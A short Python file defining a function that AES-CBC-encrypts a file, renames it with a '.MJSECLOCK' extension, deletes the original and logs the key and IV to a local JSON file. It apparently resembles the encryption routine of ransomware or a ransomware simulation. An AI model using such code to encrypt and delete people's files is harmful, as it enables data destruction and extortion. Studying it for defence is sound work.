import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import json

META_PATH = "encryption_meta.json"

def encrypt_file(file_path, key, iv):
    encrypted_path = file_path + ".MJSECLOCK"
    try:
        with open(file_path, "rb") as f:
            data = f.read()

        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        with open(encrypted_path, "wb") as f:
            f.write(encrypted_data)

        os.remove(file_path)

        if os.path.exists(META_PATH):
            with open(META_PATH, "r", encoding="utf-8") as f:
                meta = json.load(f)
        else:
            meta = {}

        meta[encrypted_path] = {
            "original_path": file_path,
            "deleted": False,
            "key": key.hex(),
            "iv": iv.hex()
        }

        with open(META_PATH, "w", encoding="utf-8") as f:
            json.dump(meta, f, indent=2)

        print(f"[+] Encrypted {file_path}")

    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")
